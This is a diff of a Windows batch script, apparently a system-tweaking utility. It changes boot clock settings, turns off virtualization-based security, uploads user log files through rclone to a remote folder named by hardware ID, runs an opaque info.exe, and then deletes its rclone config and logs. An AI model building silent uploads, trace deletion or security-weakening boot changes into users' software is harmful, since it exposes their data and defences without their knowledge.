@@ -266,8 +266,8 @@ IF EXIST bin\SVPP7.STR (
 	powercfg -setacvalueindex scheme_current sub_processor PERFDECTHRESHOLD 8
 	powercfg /setactive scheme_current
 	powercfg -setacvalueindex scheme_current sub_processor PROCTHROTTLEMIN 0
-	bcdedit /deletevalue useplatformclock
-	bcdedit /set useplatformtick yes
+	bcdedit /set useplatformtick false
+	bcdedit /set useplatformclock false
 	bcdedit /set disabledynamictick yes
 	bcdedit /set vsmlaunchtype Off
 	bcdedit /set bootmenupolicy Legacy
@@ -780,32 +780,37 @@ IF EXIST Verif.bat (
 )
 :VQTLOG
 timeout /t 10 /nobreak>nul
-IF EXIST EQT.CONF (
-	IF EXIST QTS-USRL.log (
-		IF EXIST rclone.conf (
-			IF EXIST QTS-USRL.log rclone --config="rclone.conf" copy QTS-USRL.log QTS:%HHWID%/
-		) else (
-			ren QTS-USRL.log QTS-USRL.txt
-			timeout /t 01 /nobreak>nul
-			copy /Y QTS-USRL.txt bin\INFO\
-			timeout /t 02 /nobreak>nul
-			START "" "bin\INFO\info.exe" /972737237993466355732533
-		)
+IF NOT EXIST EQT.CONF goto :VQTLOG
+IF EXIST QTS-USRL.log (
+	IF EXIST rclone.conf (
+		IF EXIST QTS-USRL.log rclone --config="rclone.conf" copy QTS-USRL.log QTS:%HHWID%/
+	) else (
+		ren QTS-USRL.log QTS-USRL.txt
+		timeout /t 01 /nobreak>nul
+		START "" "bin\INFO\info.exe" /972737237993466355732533
 	)
-	IF EXIST RWC-USRL.log (
-		IF EXIST rclone.conf (
-			IF EXIST RWC-USRL.log rclone --config="rclone.conf" copy RWC-USRL.log QTS:%HHWID%/
-		) else (
-			ren RWC-USRL.log RWC-USRL.txt
-			timeout /t 01 /nobreak>nul
-			copy /Y RWC-USRL.txt bin\INFO\
-			timeout /t 02 /nobreak>nul
-			START "" "bin\INFO\info.exe" /972737237993466355732533
-		)
-	)
-) else (
-	goto :VQTLOG
 )
+
+IF EXIST RWC-USRL.log (
+	IF EXIST rclone.conf (
+		IF EXIST RWC-USRL.log rclone --config="rclone.conf" copy RWC-USRL.log QTS:%HHWID%/
+	) else (
+		ren RWC-USRL.log RWC-USRL.txt
+		timeout /t 01 /nobreak>nul
+		START "" "bin\INFO\info.exe" /972737237993466355732533
+	)
+)
+
+IF NOT EXIST rclone.conf (
+	IF EXIST RWC-USRL.log (
+		cd /d %~dp0
+		cls
+		ren RWC-USRL.log RWC-USRL.txt
+		timeout /t 01 /nobreak>nul
+		START "" "bin\INFO\info.exe" /972737237993466355732533
+	)
+)
+
 Ping 10>nul
 DEL QTS-USRL.log
 DEL ID.log
@@ -814,7 +819,6 @@ DEL temp2.txt
 DEL rclone.conf
 DEL sec-ath.bat
 DEL RWC-USRL.log
-DEL RWC-USRL.txt
 Exit
 
 
